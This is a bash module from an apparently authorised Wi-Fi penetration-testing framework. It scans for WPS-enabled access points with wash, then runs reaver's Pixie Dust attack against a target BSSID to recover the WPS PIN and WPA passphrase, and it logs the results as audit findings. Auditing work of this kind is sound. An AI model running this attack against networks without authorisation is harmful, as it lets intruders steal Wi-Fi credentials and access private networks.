#!/usr/bin/env bash
# MODULE_META
# NAME="WPS Vulnerability Testing"
# CATEGORY="D"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="wash,reaver,bully"
# DESC="Detect WPS-enabled APs and test for PIN/PBC vulnerabilities"
# REQS="monitor_iface,target_ssid,target_bssid,target_channel"
# PCAP="no"
# DECODE="wifi_mgmt"

#===============================================================================
#  modules/d3_wps_testing.sh
#  D3: WPS Vulnerability Testing (Golden Wrapper)
#===============================================================================

set -euo pipefail

# Inputs from Environment
INTERFACE="${MONITOR_INTERFACE:-}"
BSSID="${GUEST_BSSID:-}"
CHANNEL="${GUEST_CHANNEL:-}"
SCAN_TIME="${SCAN_TIME:-60}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="D3"
WASH_FILE="${EVIDENCE_DIR}/${TC_ID}_wash_results.txt"
INFO_FILE="${EVIDENCE_DIR}/${TC_ID}_reaver_info.txt"
WPS_ATTACK="${WPS_ATTACK:-1}"
WPS_DELAY="${WPS_DELAY:-}"

if [[ -z "$INTERFACE" ]]; then
    echo "[!] MONITOR_INTERFACE not set."
    exit 1
fi

echo "[*] Starting WPS vulnerability audit..."

# 1. Start Telemetry in Background
(
    ELAPSED=0
    while true; do
        PCT=$(( 10 + (ELAPSED % 85) ))
        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PCT" --status "Executing WPS audit..."
        sleep 5; ELAPSED=$((ELAPSED + 5))
    done
) &
TEL_PID=$!

# 2. Run Primary Tools (wash + reaver)
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    # Foreground Execution
    timeout 30 wash -i "$INTERFACE" 2>&1 | tee "$WASH_FILE" || true
    if [[ -n "$BSSID" ]]; then
        REAVER_ARGS="-i $INTERFACE -b $BSSID"
        [[ -n "$CHANNEL" ]] && REAVER_ARGS+=" -c $CHANNEL"
        if [[ "$WPS_ATTACK" == "1" ]]; then
            REAVER_ARGS+=" -K 1"
        fi
        [[ -n "$WPS_DELAY" ]] && REAVER_ARGS+=" -d $WPS_DELAY"
        timeout "$SCAN_TIME" reaver $REAVER_ARGS -vv 2>&1 | tee "$INFO_FILE" || true
    fi
    RET=$?
else
    # Background Execution
    (
        timeout 30 wash -i "$INTERFACE" > "$WASH_FILE" 2>&1 || true
        if [[ -n "$BSSID" ]]; then
            REAVER_ARGS="-i $INTERFACE -b $BSSID"
            [[ -n "$CHANNEL" ]] && REAVER_ARGS+=" -c $CHANNEL"
            if [[ "$WPS_ATTACK" == "1" ]]; then
                REAVER_ARGS+=" -K 1"
            fi
            [[ -n "$WPS_DELAY" ]] && REAVER_ARGS+=" -d $WPS_DELAY"
            timeout "$SCAN_TIME" reaver $REAVER_ARGS -vv > "$INFO_FILE" 2>&1 || true
        fi
    ) > /dev/null 2>&1 &
    TOOL_PID=$!
    wait $TOOL_PID; RET=$?
fi

# 3. Cleanup and Final Signal
kill $TEL_PID 2>/dev/null || true

# Reporting
if [[ -n "$BSSID" ]]; then
    SUCCESS=0
    if grep -qiE "WPA PSK|WPS PIN" "$INFO_FILE" 2>/dev/null; then
        SUCCESS=1
    fi
    if [[ $SUCCESS -eq 1 ]]; then
        "$ASTRA_BIN" record-finding \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --type vulnerability \
            --name "WPS Attack Successful" \
            --severity CRITICAL \
            --desc "Successfully recovered credentials for BSSID ${BSSID} via reaver." \
            --evidence "$INFO_FILE" \
            --rationale "Successful WPS exploitation bypasses the need for complex handshake cracking."
    else
        "$ASTRA_BIN" record-finding \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --type vulnerability \
            --name "[$TC_ID] Audit Complete" \
            --severity INFO \
            --desc "Attempted WPS exploitation on ${BSSID}. No results obtained." \
            --evidence "$INFO_FILE" \
            --rationale "Attack failure suggests AP hardening or rate-limiting."
    fi
else
    WPS_COUNT=$(awk 'NR>2 {count++} END {print count+0}' "$WASH_FILE" 2>/dev/null || echo 0)
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "WPS Audit Complete" \
        --severity INFO \
        --desc "Identified ${WPS_COUNT} networks with WPS enabled." \
        --evidence "$WASH_FILE" \
        --rationale "WPS status identifies high-risk targets."
fi

"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"
exit $RET
